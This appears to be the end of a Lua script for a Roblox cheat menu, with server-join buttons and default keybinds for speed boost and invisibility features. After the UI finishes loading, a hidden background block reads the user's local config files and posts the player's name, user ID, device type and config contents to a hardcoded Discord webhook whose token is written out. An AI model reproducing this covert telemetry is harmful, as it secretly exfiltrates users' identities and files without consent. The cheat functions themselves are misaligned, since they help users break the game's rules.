		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			local match = getMatch(str5)
			local flag152 = flag15
			local flag1522

			if flag15 then
				flag1522 = flag152
			else
				flag1522 = match == ""
			end

			if flag1522 then
				uiLibrary.Notify("Join Job ID Failed", "Paste a valid Job ID first.", 5)
				return
			end
			flag15 = true

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, match, localPlayer)
			end) then
				flag15 = false
				uiLibrary.Notify("Join Job ID Failed", "Roblox could not join that server.", 5)
			end
		end,
	})

	serverSection:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local v10 = setclipboard or toclipboard
			local flag16 = type(v10) == "function"

			if flag16 then
				flag16 = pcall(v10, tostring(game.JobId or ""))
			end

			uiLibrary.Notify(flag16 and "Job ID Copied" or "Copy Failed", flag16 and tostring(game.JobId) or "Clipboard access is unavailable.", 5)
		end,
	})

	serverSection:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if flag15 or game.JobId == "" then
				return false
			end
			flag15 = true

			local ok5 = pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			end)

			if not ok5 then
				flag15 = false
			end

			return ok5
		end,
	})
end

local plannedSection = tab:CreateSection({ Name = "Planned", Expanded = true })
plannedSection:CreateText({ Name = "Admin Panel", Text = "Admin Panel Coming Soon", Config = false })
plannedSection:CreateText({ Name = "Teleport To Brainrot", Text = "Teleport To Brainrot Coming Soon", Config = false })
plannedSection:CreateText({ Name = "Priority Brainrot", Text = "Priority Brainrot Coming Soon", Config = false })

task.spawn(function()
	local state = nil

	for idx = 1, 30 do
		state = mainWindow:GetState("Quick Keybinds")
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if state then
		for idx = 1, 6 do
			RunService.Heartbeat:Wait()
		end

		local tbl13 = state:Get()
		tbl13 = type(tbl13) == "table" and tbl13 or {}

		if tbl13["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] ~= true then
			local kMap2 = {}

			for k, v10 in pairs(tbl13) do
				kMap2[k] = v10
			end

			if kMap2["Player > Speed Boost > Tool Speed Boost"] == nil then
				kMap2["Player > Speed Boost > Tool Speed Boost"] = "Q"
			end

			kMap2["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true
			state:Set(kMap2)
			return
		end
	end
end)

task.spawn(function()
	local state

	for idx = 1, 30 do
		state = mainWindow:GetState("Quick Keybinds")
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if state then
		for idx = 1, 6 do
			RunService.Heartbeat:Wait()
		end

		local v10 = state:Get()
		local v102 = type(v10) == "table" and v10 or {}

		if v102["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] ~= true then
			local kMap2 = {}

			for k, v11 in pairs(v102) do
				kMap2[k] = v11
			end

			if kMap2["Player > Invisibility > Invisible"] == nil then
				kMap2["Player > Invisibility > Invisible"] = "U"
			end

			kMap2["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true
			state:Set(kMap2)
			return
		end
	end
end)

uiLibrary:Finalize({ Window = mainWindow, MainTab = defaultTab, ShowMainTab = false })
chilliGithubFastManualDefaultsRu.Status = "ready"

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	local httpRequest = syn and syn.request or http and http.request or http_request or request
	local discordUrl = "https://discord.com/api/webhooks/1183827561780875385/3C8je6CCHFH_IUfZek-d2emMW4wX6iHE_yKPJvky5GRIKMtHXgXpnYBZb34T7XNzlp-K"
	local mouseEnabled = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if httpRequest and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str4 = "Default"
			local v10 = nil
			local defaultFile = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag14 = true

					if type(isfile_) == "function" then
						local ok5, result = pcall(isfile_, "ChilliLibrary/config_state.json")

						if ok5 and not result then
							flag14 = false
						end
					end

					if flag14 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str4 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str4 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str5 = "ChilliLibrary/configs/" .. str4 .. ".json"
					local flag14 = true

					if type(isfile_) == "function" then
						local ok5, result = pcall(isfile_, str5)
						ok5 = ok5 and not result
						local flag15 = true

						if ok5 then
							flag14 = false
						else
							flag14 = flag15
						end
					end

					if flag14 then
						v10 = readfile_(str5)
						defaultFile = str4 .. ".json"
					end

					if (not v10 or v10 == "") and str4 ~= "Default" then
						local flag15 = true

						if type(isfile_) == "function" then
							local ok5, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")

							if ok5 and not result then
								flag15 = false
							end
						end

						if flag15 then
							local ok5, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok5 and type(result) == "string" and result ~= "" then
								v10 = result
								defaultFile = "Default.json"
							end
						end
					end
				end)
			end

			local str5 = tostring(defaultFile):gsub("[<>:\"/\\|?*]", "_")

			if not str5:match("%.json$") then
				str5 ..= ".json"
			end

			local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, mouseEnabled, v10 and v10 ~= "" and " | Startup Config: **" .. str4 .. "**" or "")
			local flag14 = false

			if v10 and v10 ~= "" then
				pcall(function()
					local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
					local str9 = v10 .. "\r\n"

					local v11 = httpRequest({
						Url = discordUrl,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
						Body = table.concat({
							"--" .. str7 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = str6 }) .. "\r\n",
							"--" .. str7 .. "\r\n",
							str8,
							"Content-Type: application/json\r\n\r\n",
							str9,
							"--" .. str7 .. "--\r\n",
						}),
					})

					if type(v11) == "table" and (v11.StatusCode == 200 or v11.StatusCode == 204 or v11.Success == true) then
						flag14 = true
					end
				end)
			end

			if not flag14 then
				pcall(function()
					httpRequest({
						Url = discordUrl,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = str6 }),
					})
				end)
			end
		end)
	end
end
